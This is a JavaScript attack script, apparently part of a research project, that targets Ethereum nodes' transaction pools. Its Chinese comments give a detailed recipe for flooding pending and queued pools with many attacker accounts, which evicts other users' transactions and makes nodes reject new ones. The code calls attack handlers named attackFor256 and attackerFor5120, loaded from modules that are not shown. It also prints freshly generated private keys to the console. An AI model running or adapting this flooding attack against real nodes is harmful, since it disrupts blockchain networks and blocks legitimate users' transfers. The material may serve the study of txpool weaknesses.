global.ETS = {
    
}

let genKeys = function(ets){
    let privateKey = require('crypto').randomBytes(32).toString('hex');
    let publicKey = ets.attack.ea.web3.eth.accounts.privateKeyToAccount(privateKey.toString('hex'));
    console.log(`publicKey : ${publicKey.address}`);
    console.log(`privateKey : ${privateKey}`);
}

/**
 * 256个账号，每个账号发16笔交易，压满了本地4096个pending，压满了外地4096个pending
 * 然后用前16个账号发一笔17号交易给local，local会把这笔17号交易广播给remote，remote会放弃这笔交易，不放进pending。
 * 然后用前16个账号从18号开始，发64笔交易给local，local把这64笔交易广播给remote，remote全部放进queued。
 * （以上就能塞满remote的txpool
 * （其中pending的每个account上限是16，queued中每个account上限是64；pending总上限4096，queued总上限1024
 * 
 * 这个时候用17号账号发第17号交易，就会挤掉1号账号的第16号交易。
 * 这时候remote pending中1号账号的交易数为15，17号账号的交易数为17
 * 
 * 这个时候用17号账号发第18笔交易，会挤掉1号账号的15号交易。
 * 这时候1号账号的remote pending池中剩下14笔交易，17号账号的交易数为18
 * 
 * 5120个账号
 * 全部账号发1笔交易，填满pending5120缓冲区之后，再来新的任何一笔交易，remote都不接受了。
 * 比如主账号发一笔转账，remote不接受。
 * 比如attacker[0] 发一笔nonce多1的交易，remote不接受。
 */
async function main(){
    let ea = await require(`${__dirname}/actions/initEthAction`)();
    ea.web3.eth.extend({
    property: 'txpool',
        methods: [{
            name: 'content',
            call: 'txpool_content'
        },{
            name: 'inspect',
            call: 'txpool_inspect'
        },{
            name: 'status',
            call: 'txpool_status'
        }]
    });
    global.ea = ea;

    let ets = {
        attack : await require(`${__dirname}/actions/initAttack`)()
    }
    // await ets.ea.handle.checkAllBalance();
    // trans money to attacker
    // genKeys(ets);
    // await ets.ea.handle.sendTrans(ets.ea.Config, ets.ea.Config.attackers[0], 100);
    // return ;

    // await ets.attack.handle.test();
    // await ets.attack.handle.attackFor256.init();
    // await ets.attack.handle.attackFor256.start();
    // await ets.attack.handle.attackFor256.checkTxPool();

    // await ets.attack.handle.attackerFor5120.init();
    // await ets.attack.handle.attackerFor5120.attack();
    await ets.attack.handle.attackerFor5120.checkTxPool();

    // console.log(await ea.web3.eth.txpool.content())
    
}
main();